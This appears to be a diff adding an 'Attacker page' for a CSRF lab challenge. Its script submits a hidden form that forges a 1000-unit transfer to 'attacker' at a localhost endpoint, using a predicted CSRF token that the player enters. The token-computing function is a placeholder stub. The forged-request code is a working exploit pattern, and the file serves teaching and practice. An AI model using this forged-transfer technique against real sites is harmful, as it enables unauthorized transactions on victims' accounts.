@@ -1,0 +1,50 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Attacker</title>
+</head>
+
+<body>
+    <h1>Attacker page</h1>
+    <p>Click to send CSRF request (for demo only)</p>
+
+
+    <script>
+        // The attacker must compute the token client-side to include it in the forged POST.
+        // For the challenge, we'll provide a JS function that approximates the vulnerable server token.
+        // WARNING: In real environments you must not rely on time-based predictable tokens.
+
+
+        function sha1(msg) {
+            // minimal SHA-1 implementation (for demonstration). In real payloads attackers
+            // often brute-force or compute known formulas. For the challenge assume this works.
+            // You can also precompute tokens offline and paste them into the form.
+            return 'REPLACE_WITH_VALID_TOKEN';
+        }
+
+
+        function send() {
+            // Replace token with the valid token for current minute (computed by player)
+            const token = prompt('Enter the predicted CSRF token for the victim session (compute using the vulnerability)');
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://localhost:5000/transfer';
+
+
+            const t = document.createElement('input'); t.type = 'hidden'; t.name = 'to'; t.value = 'attacker'; form.appendChild(t);
+            const a = document.createElement('input'); a.type = 'hidden'; a.name = 'amount'; a.value = '1000'; form.appendChild(a);
+            const c = document.createElement('input'); c.type = 'hidden'; c.name = 'csrf_token'; c.value = token; form.appendChild(c);
+
+
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+
+
+    <button onclick="send()">Exploit (submit forged transfer)</button>
+</body>
+
+</html>
